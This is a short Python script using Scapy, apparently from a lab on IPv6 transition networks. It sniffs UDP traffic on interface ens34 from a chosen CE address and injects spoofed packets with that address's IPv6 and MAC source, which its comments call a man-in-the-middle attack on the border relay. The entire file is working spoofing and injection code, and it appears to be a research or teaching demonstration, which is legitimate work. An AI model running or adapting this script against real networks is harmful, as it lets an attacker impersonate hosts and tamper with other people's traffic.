#!/usr/bin/env python3

from scapy.all import *

# Adding IPv6 route
# the 'gw' IP here is the BR IPv6 interface.
#conf.route6.add(dst="64:ff9b::/96", gw="2001:db8:6::1")



# This script sniffes the communication channel on Interface ens34, looks for UDP Packets.
# It then sends a crafted packet to the BR, deceives it and claims to be the CE machine.
# It qualifies to be "Man in the Middle attack".

# function to process the packet
def process_packet(packet):
    # check if the packet is a UDP packet
    if packet.haslayer(UDP) and packet[IPv6].src == "2001:db8:ce:11b:0:cb00:7108:1b":
        # extract the source port
        src_port = packet[UDP].sport
        dst_port = packet[UDP].dport
        ipv6_src = packet[IPv6].src
        ipv6_dst = packet[IPv6].dst
        ether_src = packet[Ether].src
        print("[+] Found UDP packet with source port: ", src_port)
        # craft a new UDP packet
        ip = IPv6(dst=ipv6_dst,src=ipv6_src)
        eth= Ether(src=ether_src)
        udp = UDP(sport=src_port, dport=dst_port)
        data = "Hallo Bob, I am Alice, Trust me!"
        packet = eth/ip/udp/data
        sendp(packet, iface='ens34',return_packets=True)

# start sniffing on ens34
sniff(iface='ens34', filter="udp", prn=process_packet)
